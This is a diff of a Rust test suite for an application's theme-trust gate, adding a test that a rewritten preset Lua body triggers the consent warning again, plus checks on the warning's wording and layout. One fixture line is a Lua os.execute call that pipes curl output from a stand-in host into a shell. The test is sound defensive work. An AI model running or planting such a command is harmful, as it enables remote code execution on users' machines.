@@ -19463,6 +19463,85 @@ fn theme_trust_reasks_for_a_package_it_could_not_inspect() {
     assert_eq!(*applied.borrow(), 1, "declining must change nothing");
 }
 
+/// The BLOCKER the W2c dual verification refuted, end to end: the acceptance
+/// must cover a preset's BODY. The apply copies the preset file as it is ON
+/// DISK and the assembled overlay runs it, so a theme that keeps the preset
+/// NAME and rewrites its content used to apply in silence — the exact
+/// "rewire an accepted theme" attack the store exists to stop.
+///
+/// `#[serial]`: it drives the process-global gate.
+#[test]
+#[serial_test::serial]
+fn theme_trust_notices_a_rewritten_preset_body() {
+    use slint::ComponentHandle as _;
+    use slint::Model as _;
+    init_test_platform();
+    let win = crate::MainWindow::new().unwrap();
+    crate::wire_theme_trust_gate(&win);
+
+    let tmp = tempfile::tempdir().unwrap();
+    let root = tmp.path().join("themes");
+    let store_path = tmp.path().join("theme-trust.toml");
+    let presets = root.join("PresetTheme").join("presets").join("animations");
+    std::fs::create_dir_all(&presets).unwrap();
+    let lua = presets.join("Space.lua");
+    std::fs::write(&lua, "-- innocent body\n").unwrap();
+
+    let applied = std::rc::Rc::new(std::cell::RefCell::new(0usize));
+    {
+        let applied = applied.clone();
+        let weak = win.as_weak();
+        let root = root.clone();
+        let store_path = store_path.clone();
+        win.on_gallery_card_clicked(move |idx| {
+            let Some(w) = weak.upgrade() else { return };
+            if crate::trust_gate_request(
+                &w,
+                "PresetTheme",
+                idx,
+                crate::theme_trust::ApplyOrigin::Gallery,
+                &root,
+                &store_path,
+            ) {
+                *applied.borrow_mut() += 1;
+            }
+        });
+    }
+
+    // A preset is code too: the first attempt is held and warns.
+    win.invoke_gallery_card_clicked(0);
+    assert_eq!(*applied.borrow(), 0, "a package carrying a preset must be held");
+    assert!(win.get_trust_warning_open());
+    assert_eq!(
+        win.get_trust_warning_presets().row_count(),
+        1,
+        "the warning must name the preset"
+    );
+    win.invoke_trust_warning_confirmed();
+    assert_eq!(*applied.borrow(), 1, "confirming must apply the held theme");
+    assert!(store_path.is_file(), "the acceptance must be remembered");
+
+    // The very same content applies in silence.
+    win.invoke_gallery_card_clicked(0);
+    assert_eq!(*applied.borrow(), 2, "accepted content applies with no warning");
+
+    // SAME name, SAME category, DIFFERENT payload.
+    std::fs::write(&lua, "os.execute(\"curl -s evil.example | sh\")\n").unwrap();
+    win.invoke_gallery_card_clicked(0);
+    assert_eq!(
+        *applied.borrow(),
+        2,
+        "a rewritten preset BODY must be held, not applied in silence"
+    );
+    assert!(
+        win.get_trust_warning_open(),
+        "the warning must come back when the body changed"
+    );
+    win.invoke_trust_warning_cancelled();
+    assert!(!win.get_trust_warning_open());
+    assert_eq!(*applied.borrow(), 2, "declining must change nothing");
+}
+
 /// The warning's copy is the honesty contract of this feature: it must
 /// say what the package carries, ask the keeper to judge the source, and
 /// must NEVER be worded as if HVE prevented anything (it is a consent
@@ -19486,12 +19565,17 @@ fn theme_trust_warning_copy_states_the_honest_limit() {
     // W2c: Continue is no longer a one-shot — the copy must SAY what it
     // remembers, in both states, because the two states differ.
     assert!(
-        lower.contains("continuing remembers this acceptance for this theme"),
+        lower.contains("continuing remembers this acceptance"),
         "the copy must state that Continue remembers the acceptance"
     );
     assert!(
-        lower.contains("will not ask again while the content above stays exactly as it is"),
-        "the copy must scope the silence to the content the keeper was shown"
+        lower.contains("with this name and this content"),
+        "the copy must scope the silence to BOTH the name and the content — \
+         a rename re-warns, so a promise about the content alone would be false"
+    );
+    assert!(
+        lower.contains("it asks again as soon as either changes"),
+        "the copy must say the warning returns when either of the two changes"
     );
     assert!(
         lower.contains("this decision is not remembered"),
@@ -19830,6 +19914,35 @@ fn theme_trust_warning_renders_over_the_gallery_and_over_the_panel() {
         0,
         "the buttons must NOT move when the copy changes: the fixed card height \
          and the stretch carrier list absorb it"
+    );
+
+    // W2c-b: a preset the scan could NOT read in full prints its cause on its
+    // own line — a LONG line that must wrap inside the card instead of
+    // pushing anything out of it. (This state always comes with the
+    // not-remembered copy: a body nobody read is never rememberable.)
+    win.set_trust_warning_presets(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "animations/Space.lua — the preset \
+         /home/keeper/themes/Huge/presets/animations/Space.lua could not be read in full by this \
+         scan: it is 4194304 bytes, over the 16384-byte bound for a preset HVE can remember, so \
+         it may carry code that is not shown here",
+    )])));
+    settle();
+    let unreadable_preset = win
+        .window()
+        .take_snapshot()
+        .expect("gallery, preset that could not be read in full");
+    save_slice_png(
+        unreadable_preset.clone(),
+        "trust_warning_gallery_unreadable_preset.png",
+    );
+    assert!(
+        count_buffer_diff_region(&not_remembered, &unreadable_preset, 660, 280, 1260, 786) > 50,
+        "the cause of an unreadable preset must be PAINTED, not swallowed"
+    );
+    assert_eq!(
+        count_buffer_diff_region(&not_remembered, &unreadable_preset, 1020, 790, 1260, 850),
+        0,
+        "a long preset cause line must wrap inside the card, never move the buttons"
     );
     win.set_trust_warning_remembered(true);
 
